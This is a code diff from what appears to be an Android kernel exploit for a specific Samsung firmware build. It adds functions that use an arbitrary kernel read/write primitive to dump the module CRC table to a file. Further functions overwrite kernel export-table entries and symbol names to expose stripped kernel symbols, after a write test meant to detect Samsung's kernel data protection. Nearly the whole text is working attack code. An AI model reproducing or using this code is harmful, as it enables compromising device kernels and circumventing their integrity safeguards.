+/* KCRCTAB_OFF: device link-time offset of __start___kcrctab relative to
+ * KIMAGE_TEXT_BASE (measured from kallsyms on F9360ZCSAIZF1 boot, slide
+ * subtracted).  kcrctab holds the modversions CRC table, one u32 per
+ * exported symbol in __ksymtab order. */
+#define KCRCTAB_OFF 0x2217904ULL
+
+void dump_kcrctab(int fd) {
+  /* sanity: read selinux enforcing byte (known 0 while permissive) */
+  uint8_t enf = 0xff;
+  ssize_t enf_got =
+      root_read_data(fd, data_addr(SELINUX_ENFORCING), &enf, sizeof(enf));
+  pr_info("kcrctab enf probe got=%zd val=%u\n", enf_got, enf);
+  /* read 16 bytes around enforcing: real kernel .data reads back as
+   * structured values, ashmem-shm reads back as blob/marker bytes */
+  uint8_t enf16[16];
+  memset(enf16, 0xcc, sizeof(enf16));
+  uintptr_t enf_base = data_addr(SELINUX_ENFORCING) & ~(PAGE_SIZE - 1);
+  ssize_t e16 = root_read_data(fd, enf_base, enf16, sizeof(enf16));
+  pr_info("kcrctab enf16 got=%zd %02x %02x %02x %02x %02x %02x %02x %02x\n",
+          e16, enf16[0], enf16[1], enf16[2], enf16[3], enf16[4], enf16[5],
+          enf16[6], enf16[7]);
+
+  uintptr_t kcrctab = data_addr(KIMAGE_TEXT_BASE + KCRCTAB_OFF);
+  /* pipe_phys_read returns at most 1 byte on this device (pb.len not
+   * honoured): read byte by byte.  0x8000 = 32768 single-byte reads covers
+   * __kcrctab (2857 crcs) + __kcrctab_gpl (4398 crcs) = 7255 u32 total. */
+  uint8_t buf[0x8000];
+  size_t got_total = 0;
+  for (size_t i = 0; i < sizeof(buf); i++) {
+    uint8_t b = 0;
+    if (root_read_data(fd, kcrctab + i, &b, 1) != 1) {
+      pr_info("kcrctab dump byte %zu failed\n", i);
+      return;
+    }
+    buf[i] = b;
+    got_total++;
+  }
+  pr_info("kcrctab dump %zu bytes from %lx\n", got_total, kcrctab);
+  int out = open("/data/local/tmp/kcrctab.bin",
+                 O_WRONLY | O_CREAT | O_TRUNC, 0644);
+  if (out >= 0) {
+    ssize_t w = write(out, buf, sizeof(buf));
+    pr_info("kcrctab saved %zd bytes\n", w);
+    close(out);
+  }
+}
+
+/* ---- fake exports: hijack cold __ksymtab entries to resolve
+ * TRIM_UNUSED_KSYMS-stripped symbols at find_symbol() time.
+ * kernel_symbol (PREL32): { int value_offset; int name_offset;
+ * int namespace_offset; } — 12 bytes.  name_offset points at the
+ * NUL-terminated name string (usually in __ksymtab_strings).
+ * We rewrite a victim entry's value_offset to point at the real
+ * target symbol and overwrite the victim's name string in place
+ * (victim names are longer than target names, guaranteed by
+ * select-victims.py).  The runtime delta is slide-invariant:
+ * (target+slide)-(entry+slide) == target-entry. */
+void fake_exports_patch(int fd) {
+  int ok_count = 0;
+  for (size_t i = 0; i < FAKE_EXPORTS_N; i++) {
+    uintptr_t entry = fake_exports[i].victim_entry;
+    uintptr_t target = fake_exports[i].target_addr;
+
+    /* victim entry lives in the kernel image; convert link-time image
+     * address to runtime via data_addr() (same as kcrctab). */
+    uintptr_t entry_rt = data_addr(entry);
+
+    /* read current victim entry (12 bytes) — byte by byte: pipe_phys_read
+     * returns at most 1 byte on this device (pb.len not honoured). */
+    uint8_t raw[12];
+    int read_ok = 1;
+    for (size_t j = 0; j < sizeof(raw); j++) {
+      uint8_t b = 0;
+      if (root_read_data(fd, entry_rt + j, &b, 1) != 1) {
+        read_ok = 0;
+        break;
+      }
+      raw[j] = b;
+    }
+    if (!read_ok) {
+      pr_info("fake_export[%zu] read entry failed\n", i);
+      continue;
+    }
+    int32_t name_off;
+    memcpy(&name_off, raw + 4, sizeof(name_off));
+    int32_t ns_off;
+    memcpy(&ns_off, raw + 8, sizeof(ns_off));
+
+    /* name string address: PREL32 name_offset is relative to the NAME
+     * FIELD itself (entry+4), not the entry start — Samsung export.h:
+     * ".long __kstrtab_##sym - ." where '.' is the name field position. */
+    uintptr_t name_rt = data_addr((uintptr_t)((int64_t)entry + 4 + name_off));
+
+    /* KDP/RKP probe: rodata (__ksymtab_strings) writes may panic on
+     * Samsung KDP.  Try a single byte write+readback on the victim name
+     * string; abort the whole fake-export if it does not stick. */
+    uint8_t first = 0;
+    if (root_read_data(fd, name_rt, &first, 1) != 1) {
+      pr_info("fake_export[%zu] name probe read failed\n", i);
+      continue;
+    }
+    uint8_t flip = (uint8_t)(first ^ 0x5a);
+    if (root_write_data(fd, name_rt, &flip, 1) != 1) {
+      pr_info("fake_export[%zu] name probe write failed\n", i);
+      continue;
+    }
+    uint8_t back = 0;
+    root_read_data(fd, name_rt, &back, 1);
+    if (back != flip) {
+      pr_info("fake_export[%zu] KDP BLOCKED rodata write (got %02x want %02x)\n",
+              i, back, flip);
+      return;  /* do not touch the rest: Samsung KDP would panic */
+    }
+    /* restore original byte */
+    root_write_data(fd, name_rt, &first, 1);
+    pr_info("fake_export[%zu] rodata writable probe OK\n", i);
+
+    /* overwrite name string with target name (victim name is longer);
+     * byte by byte, same 1-byte limitation. */
+    const char *tgt_name = fake_export_names[i];
+    size_t tlen = strlen(tgt_name) + 1;
+    int name_ok = 1;
+    for (size_t j = 0; j < tlen; j++) {
+      if (root_write_data(fd, name_rt + j, &tgt_name[j], 1) != 1) {
+        name_ok = 0;
+        break;
+      }
+    }
+    if (!name_ok) {
+      pr_info("fake_export[%zu] name write failed\n", i);
+      continue;
+    }
+
+    /* new value_offset = target - entry (PREL32, slide-invariant) */
+    int64_t diff = (int64_t)target - (int64_t)entry;
+    if (diff < INT32_MIN || diff > INT32_MAX) {
+      pr_info("fake_export[%zu] delta %lld out of range\n", i, diff);
+      continue;
+    }
+    int32_t new_val = (int32_t)diff;
+    memcpy(raw, &new_val, sizeof(new_val));
+    /* keep name_offset/namespace_offset as-is; write back byte by byte */
+    int write_ok = 1;
+    for (size_t j = 0; j < sizeof(raw); j++) {
+      if (root_write_data(fd, entry_rt + j, &raw[j], 1) != 1) {
+        write_ok = 0;
+        break;
+      }
+    }
+    if (!write_ok) {
+      pr_info("fake_export[%zu] entry write failed\n", i);
+      continue;
+    }
+    ok_count++;
+    pr_info("fake_export[%zu] %s -> %s (entry=%zx diff=%d)\n", i,
+            fake_export_names[i], fake_export_victims[i], entry_rt,
+            new_val);
+  }
+  pr_info("fake_exports done %d/%d\n", ok_count, (int)FAKE_EXPORTS_N);
+}
